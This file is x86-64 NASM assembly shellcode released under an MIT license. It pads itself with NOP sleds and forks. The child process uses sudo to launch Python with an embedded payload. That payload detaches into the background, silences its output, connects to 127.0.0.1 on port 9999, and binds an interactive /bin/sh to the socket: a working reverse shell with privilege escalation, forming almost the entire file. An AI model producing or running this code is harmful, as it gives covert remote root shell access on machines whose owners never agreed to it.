; MIT License - Copyright 2020
; David Reguera Garcia aka Dreg - dreg@fr33project.org
; -
; http://github.com/David-Reguera-Garcia-Dreg/ - http://www.fr33project.org/
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
; FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
; IN THE SOFTWARE.

section .text
        global _start

_start:
        times 10000 db 90h

        ; db 0CCh

        mov rax, 57 ; fork
        syscall
        cmp rax, 0
        jz child
parent:
        mov rdi, rax
        mov rsi, 0
        mov rdx, 0
        mov r10, 0
        mov r8, 0
        mov rax, 61 ; wait4
        syscall

        jmp end_sc

child:
        push 0

        call fpu
; https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_detached_background
          arg3 db  `exec("""\nimport socket,subprocess,os,sys\n\npidrg = os.fork()\nif pidrg > 0:\n        sys.exit(0)\n\nos.chdir("/")\n\nos.setsid()\n\nos.umask(0)\n\ndrgpid = os.fork()\nif drgpid > 0:\n        sys.exit(0)\n\nsys.stdout.flush()\n\nsys.stderr.flush()\n\nfdreg = open("/dev/null", "w")\n\nsys.stdout = fdreg\n\nsys.stderr = fdreg\n\nsdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\nsdregs.connect((str(0x7f000001),9999))\n\nos.dup2(sdregs.fileno(),0)\n\nos.dup2(sdregs.fileno(),1)\n\nos.dup2(sdregs.fileno(),2)\n\np=subprocess.call(["/bin/sh","-i"])\n""")`,0
fpu:
        call lxz
        arg2 db  `-c`,0
lxz:
        call drgs
        arg1 db  `/bin/python`,0
drgs:

        lea rax, [rel msg]
        push rax
        xor rdx, rdx            ; No Env
        mov rsi, rsp            ;argv
        lea rdi, [rel msg]   ; file
        mov rax, 59 ; __NR_execve
        syscall

        mov rax, 60 ; exit
        mov rbx, 0
        syscall

        msg db `/bin/sudo`,0
end_sc:
        times 1000 db 90h

